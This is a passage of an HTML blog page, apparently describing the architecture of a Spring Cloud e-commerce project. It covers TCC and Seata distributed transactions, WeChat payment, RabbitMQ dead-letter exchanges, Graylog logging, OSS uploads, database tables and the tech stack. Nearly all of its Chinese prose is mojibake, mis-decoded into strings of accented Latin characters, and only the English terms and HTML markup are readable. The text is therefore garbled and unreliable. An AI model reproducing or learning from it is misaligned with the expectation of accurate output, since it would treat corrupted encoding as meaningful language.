<p>å®Œæˆä¸Šé¢çš„æ“ä½œéœ€è¦è®¿é—®ä¸‰ä¸ªä¸åŒçš„å¾®æœåŠ¡å’Œä¸‰ä¸ªä¸åŒçš„æ•°æ®åº“ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120492.png" alt="image-20210704031058760"></p>
<h5 id="è®¾è®¡æ–¹æ¡ˆä¸€ï¼šTCC"><a href="#è®¾è®¡æ–¹æ¡ˆä¸€ï¼šTCC" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆä¸€ï¼šTCC"></a>è®¾è®¡æ–¹æ¡ˆä¸€ï¼šTCC</h5><p>æ‰§è¡Œåˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>å‡†å¤‡é˜¶æ®µï¼ˆtryï¼‰ï¼šèµ„æºçš„æ£€æµ‹å’Œé¢„ç•™ï¼›</li>
<li>æ‰§è¡Œé˜¶æ®µï¼ˆconfirm&#x2F;cancelï¼‰ï¼šæ ¹æ®ä¸Šä¸€æ­¥ç»“æœï¼Œåˆ¤æ–­ä¸‹é¢çš„æ‰§è¡Œæ–¹æ³•ã€‚å¦‚æœä¸Šä¸€æ­¥ä¸­æ‰€æœ‰äº‹åŠ¡å‚ä¸è€…éƒ½æˆåŠŸï¼Œåˆ™è¿™é‡Œæ‰§è¡Œconfirmã€‚åä¹‹ï¼Œæ‰§è¡Œcancel</li>
</ul>
<p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120493.png" alt="image-20210704031150404"></p>
<ul>
<li><p>ä¼˜åŠ¿</p>
<p>TCCæ‰§è¡Œçš„æ¯ä¸€ä¸ªé˜¶æ®µéƒ½ä¼šæäº¤æœ¬åœ°äº‹åŠ¡å¹¶é‡Šæ”¾é”ï¼Œå¹¶ä¸éœ€è¦ç­‰å¾…å…¶å®ƒäº‹åŠ¡çš„æ‰§è¡Œç»“æœã€‚è€Œå¦‚æœå…¶å®ƒäº‹åŠ¡æ‰§è¡Œå¤±è´¥ï¼Œæœ€åä¸æ˜¯å›æ»šï¼Œè€Œæ˜¯æ‰§è¡Œè¡¥å¿æ“ä½œã€‚è¿™æ ·å°±é¿å…äº†èµ„æºçš„é•¿æœŸé”å®šå’Œé˜»å¡ç­‰å¾…ï¼Œæ‰§è¡Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼Œå±äºæ€§èƒ½æœ€å¥½çš„åˆ†å¸ƒå¼äº‹åŠ¡æ–¹å¼ã€‚</p>
</li>
<li><p>ç¼ºç‚¹</p>
<ul>
<li>ä»£ç ä¾µå…¥ï¼šéœ€è¦äººä¸ºç¼–å†™ä»£ç å®ç°ï¼Œä»£ç ä¾µå…¥è¾ƒå¤š</li>
<li>å¼€å‘æˆæœ¬é«˜ï¼šä¸€ä¸ªä¸šåŠ¡éœ€è¦æ‹†åˆ†æˆ3ä¸ªæ­¥éª¤ï¼Œåˆ†åˆ«ç¼–å†™ä¸šåŠ¡å®ç°ï¼Œä¸šåŠ¡ç¼–å†™æ¯”è¾ƒå¤æ‚</li>
<li>å®‰å…¨æ€§è€ƒè™‘ï¼šcancelåŠ¨ä½œå¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œèµ„æºå°±æ— æ³•é‡Šæ”¾ï¼Œéœ€è¦å¼•å…¥é‡è¯•æœºåˆ¶ï¼Œè€Œé‡è¯•å¯èƒ½å¯¼è‡´é‡å¤æ‰§è¡Œï¼Œè¿˜è¦è€ƒè™‘é‡è¯•æ—¶çš„å¹‚ç­‰é—®é¢˜</li>
</ul>
</li>
</ul>
<h6 id="è®¾è®¡æ–¹æ¡ˆäºŒï¼šæ¶ˆæ¯æœåŠ¡"><a href="#è®¾è®¡æ–¹æ¡ˆäºŒï¼šæ¶ˆæ¯æœåŠ¡" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆäºŒï¼šæ¶ˆæ¯æœåŠ¡"></a>è®¾è®¡æ–¹æ¡ˆäºŒï¼šæ¶ˆæ¯æœåŠ¡</h6><p>ä¸€èˆ¬åˆ†ä¸ºäº‹åŠ¡çš„å‘èµ·è€…Aå’Œäº‹åŠ¡çš„å…¶å®ƒå‚ä¸è€…Bï¼š</p>
<ul>
<li>äº‹åŠ¡å‘èµ·è€…Aæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>äº‹åŠ¡å‘èµ·è€…Aé€šè¿‡MQå°†éœ€è¦æ‰§è¡Œçš„äº‹åŠ¡ä¿¡æ¯å‘é€ç»™äº‹åŠ¡å‚ä¸è€…B</li>
<li>äº‹åŠ¡å‚ä¸è€…Bæ¥æ”¶åˆ°æ¶ˆæ¯åæ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
</ul>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120494.png" alt="image-20210704031324120"></p>
<h6 id="è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šç‹¬ç«‹æ¶ˆæ¯æœåŠ¡"><a href="#è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šç‹¬ç«‹æ¶ˆæ¯æœåŠ¡" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šç‹¬ç«‹æ¶ˆæ¯æœåŠ¡"></a>è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šç‹¬ç«‹æ¶ˆæ¯æœåŠ¡</h6><p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120495.png" alt="image-20210704031432367"></p>
<p>æ—¶åºå›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120496.png" alt="image-20210704031531841"></p>
<p>äº‹åŠ¡å‘èµ·è€…Açš„åŸºæœ¬æ‰§è¡Œæ­¥éª¤ï¼š</p>
<ul>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>é€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œå‡†å¤‡å‘é€æ¶ˆæ¯ï¼ˆæ¶ˆæ¯æœåŠ¡å°†æ¶ˆæ¯æŒä¹…åŒ–ï¼Œæ ‡è®°ä¸ºå‡†å¤‡å‘é€ï¼‰</li>
<li>æ‰§è¡Œæœ¬åœ°ä¸šåŠ¡ï¼Œ<ul>
<li>æ‰§è¡Œå¤±è´¥åˆ™ç»ˆæ­¢ï¼Œé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œå–æ¶ˆå‘é€ï¼ˆæ¶ˆæ¯æœåŠ¡ä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</li>
<li>æ‰§è¡ŒæˆåŠŸåˆ™ç»§ç»­ï¼Œé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œç¡®è®¤å‘é€ï¼ˆæ¶ˆæ¯æœåŠ¡å‘é€æ¶ˆæ¯ã€ä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</li>
</ul>
</li>
<li>æäº¤æœ¬åœ°äº‹åŠ¡</li>
</ul>
<p>æ¶ˆæ¯æœåŠ¡æœ¬èº«æä¾›ä¸‹é¢çš„æ¥å£ï¼š</p>
<ul>
<li>å‡†å¤‡å‘é€ï¼šæŠŠæ¶ˆæ¯æŒä¹…åŒ–åˆ°æ•°æ®åº“ï¼Œå¹¶æ ‡è®°çŠ¶æ€ä¸ºå‡†å¤‡å‘é€</li>
<li>å–æ¶ˆå‘é€ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå–æ¶ˆ</li>
<li>ç¡®è®¤å‘é€ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºç¡®è®¤å‘é€ã€‚å°è¯•å‘é€æ¶ˆæ¯ï¼ŒæˆåŠŸåä¿®æ”¹çŠ¶æ€ä¸ºå·²å‘é€</li>
<li>ç¡®è®¤æ¶ˆè´¹ï¼šæ¶ˆè´¹è€…å·²ç»æ¥æ”¶å¹¶å¤„ç†æ¶ˆæ¯ï¼ŒæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå·²æ¶ˆè´¹</li>
<li>å®šæ—¶ä»»åŠ¡ï¼šå®šæ—¶æ‰«ææ•°æ®åº“ä¸­çŠ¶æ€ä¸ºç¡®è®¤å‘é€çš„æ¶ˆæ¯ï¼Œç„¶åè¯¢é—®å¯¹åº”çš„äº‹åŠ¡å‘èµ·è€…ï¼Œäº‹åŠ¡ä¸šåŠ¡æ‰§è¡Œæ˜¯å¦æˆåŠŸï¼Œç»“æœï¼š<ul>
<li>ä¸šåŠ¡æ‰§è¡ŒæˆåŠŸï¼šå°è¯•å‘é€æ¶ˆæ¯ï¼ŒæˆåŠŸåä¿®æ”¹çŠ¶æ€ä¸ºå·²å‘é€</li>
<li>ä¸šåŠ¡æ‰§è¡Œå¤±è´¥ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå–æ¶ˆ</li>
</ul>
</li>
</ul>
<p>äº‹åŠ¡å‚ä¸è€…Bçš„åŸºæœ¬æ­¥éª¤ï¼š</p>
<ul>
<li>æ¥æ”¶æ¶ˆæ¯</li>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>æ‰§è¡Œä¸šåŠ¡</li>
<li>é€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œæ¶ˆæ¯å·²ç»æ¥æ”¶å’Œå¤„ç†</li>
<li>æäº¤äº‹åŠ¡</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>è§£é™¤äº†äº‹åŠ¡ä¸šåŠ¡ä¸æ¶ˆæ¯ç›¸å…³ä¸šåŠ¡çš„è€¦åˆ</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°èµ·æ¥æ¯”è¾ƒå¤æ‚</li>
</ul>
<h6 id="è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šSeata"><a href="#è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šSeata" class="headerlink" title="è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šSeata"></a>è®¾è®¡æ–¹æ¡ˆä¸‰ï¼šSeata</h6><p>ä¸€ä¸ªç”¨æˆ·è´­ä¹°å•†å“çš„ä¸šåŠ¡é€»è¾‘ã€‚æ•´ä¸ªä¸šåŠ¡é€»è¾‘ç”±3ä¸ªå¾®æœåŠ¡æä¾›æ”¯æŒï¼š</p>
<ul>
<li>ä»“å‚¨æœåŠ¡ï¼šå¯¹ç»™å®šçš„å•†å“æ‰£é™¤ä»“å‚¨æ•°é‡ã€‚</li>
<li>è®¢å•æœåŠ¡ï¼šæ ¹æ®é‡‡è´­éœ€æ±‚åˆ›å»ºè®¢å•ã€‚</li>
<li>å¸æˆ·æœåŠ¡ï¼šä»ç”¨æˆ·å¸æˆ·ä¸­æ‰£é™¤ä½™é¢ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120497.png" alt="image-20210704031726133"></p>
<h5 id="å¾®ä¿¡æ”¯ä»˜"><a href="#å¾®ä¿¡æ”¯ä»˜" class="headerlink" title="å¾®ä¿¡æ”¯ä»˜"></a>å¾®ä¿¡æ”¯ä»˜</h5><ul>
<li>å•†æˆ·ç”Ÿæˆè®¢å•</li>
<li>å•†æˆ·è°ƒç”¨å¾®ä¿¡ä¸‹å•æ¥å£ï¼Œè·å–é¢„äº¤æ˜“çš„é“¾æ¥</li>
<li>å•†æˆ·å°†é“¾æ¥ç”ŸæˆäºŒç»´ç å›¾ç‰‡ï¼Œå±•ç¤ºç»™ç”¨æˆ·ï¼›</li>
<li>æ”¯ä»˜ç»“æœé€šçŸ¥ï¼š<ul>
<li>å¾®ä¿¡å¼‚æ­¥é€šçŸ¥å•†æˆ·æ”¯ä»˜ç»“æœï¼Œå•†æˆ·å‘ŠçŸ¥å¾®ä¿¡æ”¯ä»˜æ¥æ”¶æƒ…å†µ</li>
<li>å•†æˆ·å¦‚æœæ²¡æœ‰æ”¶åˆ°é€šçŸ¥ï¼Œå¯ä»¥è°ƒç”¨æ¥å£ï¼ŒæŸ¥è¯¢æ”¯ä»˜çŠ¶æ€</li>
</ul>
</li>
<li>å¦‚æœæ”¯ä»˜æˆåŠŸï¼Œå‘è´§ï¼Œä¿®æ”¹è®¢å•çŠ¶æ€</li>
</ul>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120498.png" alt="image-20210704032529120"></p>
<h5 id="è®¢å•æ¸…ç†"><a href="#è®¢å•æ¸…ç†" class="headerlink" title="è®¢å•æ¸…ç†"></a>è®¢å•æ¸…ç†</h5><p>ä½¿ç”¨æ­»ä¿¡äº¤æ¢æœºï¼ˆDead Letter Exchangeï¼‰æ¥æ¸…ç†ã€‚</p>
<p>æ­»ä¿¡äº¤æ¢æœºæµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120499.png" alt="image-20210704033149542">ã€</p>
<p>åœ¨å£°æ˜çš„æ—¶å€™ï¼Œé€šè¿‡<code>x-dead-letter-exchange</code>å±æ€§æŒ‡å®šä¸€ä¸ªäº¤æ¢æœºï¼Œè¢«æŒ‡å®šçš„äº¤æ¢æœºå°±æ˜¯<strong>æ­»ä¿¡äº¤æ¢æœºï¼ˆDead Letter Exchangeï¼‰</strong>ã€‚åŒæ—¶é˜Ÿåˆ—è¿˜å¯ä»¥æŒ‡å®šä¸€ä¸ª<code>x-dead-letter-routing-key</code>ï¼ˆæ­»ä¿¡è·¯ç”±ï¼‰ä½œä¸ºæ­»ä¿¡çš„<code>routing_key</code>ï¼Œæ­»ä¿¡äº¤æ¢æœºè½¬å‘æ¶ˆæ¯æ—¶ä¼šæ ¹æ®è¿™ä¸ª<code>routing_key</code>æ¥è½¬å‘æ¶ˆæ¯ã€‚</p>
<p>æ­»ä¿¡äº¤æ¢æœºæ¥æ”¶åˆ°æ¶ˆæ¯ä»¥åï¼Œä¼šæ ¹æ®æ¶ˆæ¯çš„<code>routing_key</code>å†æ¬¡è½¬å‘æ¶ˆæ¯åˆ°ç»‘å®šçš„é˜Ÿåˆ—ï¼Œå¦‚æœé˜Ÿåˆ—ç»‘å®šåˆ°æ­»ä¿¡äº¤æ¢æœºæ—¶ï¼Œä¼šæ ¹æ®é˜Ÿåˆ—æŒ‡å®šçš„<code>x-dead-letter-routing-key</code>æ¥è½¬å‘ï¼Œå¦‚æœé˜Ÿåˆ—æ²¡æœ‰ç»‘å®šï¼Œåˆ™ä¼šæ ¹æ®æ¶ˆæ¯æ¥æºæ—¶æŒ‡å®šçš„<code>routing_key</code>æ¥è½¬å‘ã€‚</p>
<p>ä¾‹å¦‚ï¼šç°åœ¨publisherå‘é€æ¶ˆæ¯æ—¶æŒ‡å®š<code>routing_key</code>ä¸º<code>foo</code>ï¼Œé˜Ÿåˆ—ç»‘å®šæ­»ä¿¡äº¤æ¢æœºæ—¶æŒ‡å®šäº†<strong>æ­»ä¿¡è·¯ç”±</strong>ä¸ºï¼š<code>bar</code>ï¼Œåˆ™æ­»ä¿¡äº¤æ¢æœºè½¬å‘æ—¶ï¼Œä¼šä½¿ç”¨<code>bar</code>ä½œä¸º<code>routing_key</code>ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120500.png" alt="image-20210704033509109"></p>
<h3 id="åŸºç¡€æœåŠ¡"><a href="#åŸºç¡€æœåŠ¡" class="headerlink" title="åŸºç¡€æœåŠ¡"></a>åŸºç¡€æœåŠ¡</h3><h4 id="çŸ­ä¿¡å¾®æœåŠ¡"><a href="#çŸ­ä¿¡å¾®æœåŠ¡" class="headerlink" title="çŸ­ä¿¡å¾®æœåŠ¡"></a>çŸ­ä¿¡å¾®æœåŠ¡</h4><p>è´Ÿè´£ä»RabbitMQä¸­å–å‘çŸ­ä¿¡ä»»åŠ¡ï¼Œç„¶åæ‰§è¡Œå‘çŸ­ä¿¡æœåŠ¡ã€‚</p>
<h4 id="æƒé™å¾®æœåŠ¡"><a href="#æƒé™å¾®æœåŠ¡" class="headerlink" title="æƒé™å¾®æœåŠ¡"></a>æƒé™å¾®æœåŠ¡</h4><p>è´Ÿè´£æƒé™è®¤è¯ï¼Œæˆæƒç­‰</p>
<h4 id="æ—¥å¿—æœåŠ¡"><a href="#æ—¥å¿—æœåŠ¡" class="headerlink" title="æ—¥å¿—æœåŠ¡"></a>æ—¥å¿—æœåŠ¡</h4><p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸‹ï¼Œå¾®æœåŠ¡è¢«æ‹†åˆ†æˆå¤šä¸ªå¾®å°çš„æœåŠ¡ï¼Œæ¯ä¸ªå¾®å°çš„æœåŠ¡éƒ½éƒ¨ç½²åœ¨ä¸åŒçš„æœåŠ¡å™¨å®ä¾‹ä¸Šï¼Œå½“æˆ‘ä»¬å®šä½é—®é¢˜ï¼Œæ£€ç´¢æ—¥å¿—çš„æ—¶å€™éœ€è¦ä¾æ¬¡ç™»å½•æ¯å°æœåŠ¡å™¨è¿›è¡Œæ£€ç´¢ã€‚è¿™æ ·æ˜¯ä¸æ˜¯æ„Ÿè§‰å¾ˆç¹çå’Œæ•ˆç‡ä½ä¸‹ã€‚æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå·¥å…·æ¥å¸®åŠ©é›†ä¸­æ”¶é›†ã€å­˜å‚¨å’Œæœç´¢è¿™äº›è·Ÿè¸ªä¿¡æ¯ã€‚é›†ä¸­åŒ–ç®¡ç†æ—¥å¿—åï¼Œæ—¥å¿—çš„ç»Ÿè®¡å’Œæ£€ç´¢åˆæˆä¸ºä¸€ä»¶æ¯”è¾ƒéº»çƒ¦çš„äº‹æƒ…ã€‚ä»¥å‰ï¼Œæˆ‘ä»¬é€šè¿‡ä½¿ç”¨grepã€awkå’Œwcç­‰Linuxå‘½ä»¤èƒ½å®ç°æ£€ç´¢å’Œç»Ÿè®¡ï¼Œä½†æ˜¯å¯¹äºè¦æ±‚æ›´é«˜çš„æŸ¥è¯¢ã€æ’åºå’Œç»Ÿè®¡ç­‰è¦æ±‚å’Œåºå¤§çš„æœºå™¨æ•°é‡ä¾ç„¶ä½¿ç”¨è¿™æ ·çš„æ–¹æ³•éš¾å…æœ‰ç‚¹åŠ›ä¸ä»å¿ƒã€‚</p>
<p>åˆ†å¸ƒå¼æ—¥å¿—æœåŠ¡é€‰æ‹©graylog4.1ï¼Œç›¸æ¯”äºELKçš„è§£å†³æ–¹æ¡ˆï¼Œgraylogæœ‰è‡ªå·±çš„ä¼˜åŠ¿ã€‚</p>
<p>ELKè§£å†³æ–¹æ¡ˆçš„é—®é¢˜ï¼š</p>
<ol>
<li>ä¸èƒ½å¤„ç†å¤šè¡Œæ—¥å¿—ï¼Œæ¯”å¦‚Mysqlæ…¢æŸ¥è¯¢ï¼ŒTomcat&#x2F;Jettyåº”ç”¨çš„Javaå¼‚å¸¸æ‰“å°</li>
<li>ä¸èƒ½ä¿ç•™åŸå§‹æ—¥å¿—ï¼Œåªèƒ½æŠŠåŸå§‹æ—¥å¿—åˆ†å­—æ®µä¿å­˜ï¼Œè¿™æ ·æœç´¢æ—¥å¿—ç»“æœæ˜¯ä¸€å †Jsonæ ¼å¼æ–‡æœ¬ï¼Œæ— æ³•é˜…è¯»ã€‚</li>
<li>ä¸ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¥å¿—è¡Œï¼Œè¢«å…¨éƒ¨ä¸¢å¼ƒã€‚</li>
</ol>
<p>GrayLogæ–¹æ¡ˆçš„ä¼˜åŠ¿ï¼š</p>
<ol>
<li>ä¸€ä½“åŒ–æ–¹æ¡ˆï¼Œå®‰è£…æ–¹ä¾¿ï¼Œä¸åƒELKæœ‰3ä¸ªç‹¬ç«‹ç³»ç»Ÿé—´çš„é›†æˆé—®é¢˜ã€‚</li>
<li>é‡‡é›†åŸå§‹æ—¥å¿—ï¼Œå¹¶å¯ä»¥äº‹åå†æ·»åŠ å­—æ®µï¼Œæ¯”å¦‚http_status_codeï¼Œresponse_timeç­‰ç­‰ã€‚</li>
<li>è‡ªå·±å¼€å‘é‡‡é›†æ—¥å¿—çš„è„šæœ¬ï¼Œå¹¶ç”¨curl&#x2F;ncå‘é€åˆ°Graylog Serverï¼Œå‘é€æ ¼å¼æ˜¯è‡ªå®šä¹‰çš„GELFï¼ŒFluntedå’ŒLogstashéƒ½æœ‰ç›¸åº”çš„è¾“å‡ºGELFæ¶ˆæ¯çš„æ’ä»¶ã€‚è‡ªå·±å¼€å‘å¸¦æ¥å¾ˆå¤§çš„è‡ªç”±åº¦ã€‚å®é™…ä¸Šåªéœ€è¦ç”¨inotifywaitç›‘æ§æ—¥å¿—çš„modifyäº‹ä»¶ï¼Œå¹¶æŠŠæ—¥å¿—çš„æ–°å¢è¡Œç”¨curl&#x2F;netcatå‘é€åˆ°Graylog Serverå°±å¯ã€‚</li>
<li>æœç´¢ç»“æœé«˜äº®æ˜¾ç¤ºï¼Œå°±åƒgoogleä¸€æ ·ã€‚</li>
<li>æœç´¢è¯­æ³•ç®€å•ï¼Œæ¯”å¦‚ï¼š source:mongo AND reponse_time_ms:&gt;5000ï¼Œé¿å…ç›´æ¥è¾“å…¥elasticsearchæœç´¢jsonè¯­æ³•</li>
<li>æœç´¢æ¡ä»¶å¯ä»¥å¯¼å‡ºä¸ºelasticsearchçš„æœç´¢jsonæ–‡æœ¬ï¼Œæ–¹ä¾¿ç›´æ¥å¼€å‘è°ƒç”¨elasticsearch rest apiçš„æœç´¢è„šæœ¬ã€‚</li>
</ol>
<h4 id="é˜¿é‡Œäº‘OSSæœåŠ¡"><a href="#é˜¿é‡Œäº‘OSSæœåŠ¡" class="headerlink" title="é˜¿é‡Œäº‘OSSæœåŠ¡"></a>é˜¿é‡Œäº‘OSSæœåŠ¡</h4><p>ä¸Šä¼ å›¾ç‰‡è‡³osså¯é€‰çš„è®¾è®¡æ–¹æ¡ˆæœ‰ä¸‰ç§ï¼Œå¦‚ä¸‹ï¼š</p>
<p>ä¼ ç»Ÿæ–¹å¼ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120501.png" alt="image-20210703151536054"></p>
<p>webå‰ç«¯ç­¾åç›´ä¼ ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120502.png" alt="image-20210703151623594"></p>
<p>æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹å›¾ï¼š</p>
<ul>
<li>ç”¨æˆ·å‘é€ä¸Šä¼ è¯·æ±‚åˆ°åº”ç”¨æœåŠ¡å™¨</li>
<li>åº”ç”¨æœåŠ¡å™¨è¿”å›ä¸Šä¼ policyå’Œç­¾åç»™ç”¨æˆ·</li>
<li>ç”¨æˆ·ç›´æ¥ä¸Šä¼ æ•°æ®åˆ°OSS</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120503.png" alt="image-20210703151703004"></p>
<h3 id="æ•°æ®å±‚"><a href="#æ•°æ®å±‚" class="headerlink" title="æ•°æ®å±‚"></a>æ•°æ®å±‚</h3><h4 id="MySQL-1"><a href="#MySQL-1" class="headerlink" title="MySQL"></a>MySQL</h4><p>å¯è®¾è®¡</p>
<p>tb_brand:å“ç‰Œè¡¨</p>
<p>tb_category:åˆ†ç±»è¡¨</p>
<p>tb_category_brandï¼šå“ç‰Œå’Œåˆ†ç±»ä¸­é—´è¡¨</p>
<p>tb_couponï¼šä¼˜æƒ å·</p>
<p>tb_orderï¼šè®¢å•è¡¨</p>
<p>tb_order_detailï¼šè®¢å•ç»†èŠ‚è¡¨</p>
<p>tb_order_logisticsï¼šè®¢å•å‘è´§åœ°å€è¡¨</p>
<p>tb_pay_logï¼šæ”¯ä»˜è¯¦æƒ…è¡¨</p>
<p>tb_promition_conditionï¼šä¼˜æƒ æ¡ä»¶è¡¨</p>
<p>tb_promitionï¼šç§’æ€è¡¨</p>
<p>tb_skuï¼šå•†å“skuè¡¨</p>
<p>tb_spec_groupï¼šå•†å“è§„æ ¼ç»„è¡¨</p>
<p>tb_spec_paramï¼šå•†å“å‚æ•°è¡¨</p>
<p>tb_spuï¼šSpuè¡¨</p>
<p>tb_spu_detailï¼šspuè¯¦æƒ…è¡¨</p>
<p>tb_userï¼šç”¨æˆ·è¡¨</p>
<p>tb_user_couponï¼šç”¨æˆ·ä¼˜æƒ å·è¡¨</p>
<p>undo_logï¼šseataçš„undo logè¡¨</p>
<h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>ç”¨äºåšæœç´¢æ¨è</p>
<h4 id="Redis-1"><a href="#Redis-1" class="headerlink" title="Redis"></a>Redis</h4><p>å­˜å‚¨çŸ­ä¿¡éªŒè¯ç ï¼Œç”¨æˆ·tokenï¼Œå•†å“SPUï¼ŒSKUä¿¡æ¯</p>
<h4 id="MongoDB-1"><a href="#MongoDB-1" class="headerlink" title="MongoDB"></a>MongoDB</h4><p>å¯¹äºè´­ç‰©è½¦æ•°æ®ï¼Œä¸æ˜¯å¾ˆé‡è¦å¹¶ä¸”æ•°é‡å¾ˆå¤šï¼Œä½¿ç”¨MySQLå­˜å‚¨æˆæœ¬æ¯”è¾ƒé«˜ï¼Œå¯ä»¥ä½¿ç”¨æ›´å»‰ä»·çš„MongoDBæ¥å­˜å‚¨ã€‚</p>
<h1 id="äº”ã€é¡¹ç›®ä¸»è¦æ¨¡å—å®ç°"><a href="#äº”ã€é¡¹ç›®ä¸»è¦æ¨¡å—å®ç°" class="headerlink" title="äº”ã€é¡¹ç›®ä¸»è¦æ¨¡å—å®ç°"></a>äº”ã€é¡¹ç›®ä¸»è¦æ¨¡å—å®ç°</h1><h2 id="é¡¹ç›®å‡†å¤‡å·¥ä½œ"><a href="#é¡¹ç›®å‡†å¤‡å·¥ä½œ" class="headerlink" title="é¡¹ç›®å‡†å¤‡å·¥ä½œ"></a>é¡¹ç›®å‡†å¤‡å·¥ä½œ</h2><h3 id="æŠ€æœ¯é€‰æ‹©"><a href="#æŠ€æœ¯é€‰æ‹©" class="headerlink" title="æŠ€æœ¯é€‰æ‹©"></a>æŠ€æœ¯é€‰æ‹©</h3><p>å‰ç«¯æŠ€æœ¯åŒ…æ‹¬ï¼š</p>
<ul>
<li>åŸºç¡€çš„HTMLã€CSSã€JavaScriptï¼ˆåŸºäºES6æ ‡å‡†ï¼‰</li>
<li>JQuery</li>
<li>Vue.js 2.0</li>
<li>åŸºäºVueçš„UIæ¡†æ¶ï¼šVuetifyã€ç±»ä¼¼äºBootStrapã€element-ui</li>
<li>å‰ç«¯æ„å»ºå·¥å…·ï¼šWebPackï¼Œé¡¹ç›®ç¼–è¯‘ã€æ‰“åŒ…å·¥å…·</li>
<li>å‰ç«¯å®‰è£…åŒ…å·¥å…·ï¼šNPM</li>
<li>Vueè„šæ‰‹æ¶ï¼šVue-cli</li>
<li>Vueè·¯ç”±ï¼švue-router</li>
<li>ajaxæ¡†æ¶ï¼šaxios</li>
<li>åŸºäºVueçš„å¯Œæ–‡æœ¬æ¡†æ¶ï¼šquill-editor</li>
</ul>
<p>æœåŠ¡ç«¯æŠ€æœ¯åŒ…æ‹¬ï¼š</p>
<ul>
<li>åŸºç¡€çš„SpringMVCã€Springå’ŒMyBatisï¼ˆMybatisPlusï¼‰</li>
<li>Spring Boot 2</li>
<li>Spring Cloud æŠ€æœ¯æ ˆ</li>
<li>OpenRestyï¼ˆNginx + Luaï¼‰</li>
<li>Redisã€Jedisã€Luaè„šæœ¬</li>
<li>RabbitMQ</li>
<li>Elasticsearch</li>
<li>Nginx</li>
<li>MongoDB</li>
<li>Canal</li>
<li>JWT</li>
<li>GrayLogæ—¥å¿—ç³»ç»Ÿ</li>
<li>Skywalkingé“¾è·¯è¿½è¸ª</li>
<li>Seataåˆ†å¸ƒå¼äº‹åŠ¡</li>
<li>é˜¿é‡ŒOSSã€CMSç­‰æœåŠ¡</li>
<li>å¾®ä¿¡æ”¯ä»˜</li>
</ul>
<h3 id="é¡¹ç›®å¼€å‘ç¯å¢ƒ"><a href="#é¡¹ç›®å¼€å‘ç¯å¢ƒ" class="headerlink" title="é¡¹ç›®å¼€å‘ç¯å¢ƒ"></a>é¡¹ç›®å¼€å‘ç¯å¢ƒ</h3><ul>
<li>IDEï¼šä½¿ç”¨IDEA 2020.3å’ŒWebStorm 2020.3</li>
<li>JDKï¼šç»Ÿä¸€ä½¿ç”¨JDK1.8</li>
<li>é¡¹ç›®æ„å»ºï¼šmaven 3.2.x</li>
</ul>
<h3 id="é¡¹ç›®æµ‹è¯•ç¯å¢ƒ"><a href="#é¡¹ç›®æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="é¡¹ç›®æµ‹è¯•ç¯å¢ƒ"></a>é¡¹ç›®æµ‹è¯•ç¯å¢ƒ</h3><ul>
<li><p>Windows 10 16G</p>
